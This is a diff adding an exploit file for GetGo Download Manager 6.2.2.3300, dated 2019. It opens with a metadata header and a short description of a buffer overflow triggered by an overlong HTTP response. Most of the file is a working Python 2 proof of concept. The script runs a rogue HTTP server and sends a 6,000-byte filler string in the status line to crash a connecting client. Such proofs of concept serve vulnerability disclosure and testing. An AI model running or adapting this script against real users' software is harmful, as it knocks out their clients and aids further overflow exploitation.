@@ -1,0 +1,39 @@
+# Exploit Title : GetGo Download Manager 6.2.2.3300 - Denial of Service
+# Date: 2019-08-15
+# Author - Malav Vyas
+# Vulnerable Software: GetGo Download Manager 6.2.2.3300
+# Vendor Home Page: www.getgosoft.com
+# Software Link: http://www.getgosoft.com/getgodm/
+# Tested On: Windows 7 (64Bit), Windows 10 (64Bit)
+# Attack Type : Remote
+# Impact : DoS
+# Co-author - Velayuthm Selvaraj
+
+# 1. Description
+# A buffer overflow vulnerability in GetGo Download Manager 6.2.2.3300 and 
+# earlier could allow Remote NAS HTTP servers to perfor DOS via a long response.
+
+# 2. Proof of Concept
+
+import socket
+from time import sleep
+host = "192.168.0.112"
+port = 80
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind((host, port))
+sock.listen(1)
+print "\n[+] Listening on %d ..." % port
+
+cl, addr = sock.accept()
+print "[+] Connected to %s" % addr[0]
+evilbuffer = "A" * 6000
+    
+buffer = "HTTP/1.1 200 " + evilbuffer + "\r\n"
+
+print cl.recv(1000)
+cl.send(buffer)
+print "[+] Sending buffer: OK\n"
+
+sleep(30)
+cl.close()
+sock.close()
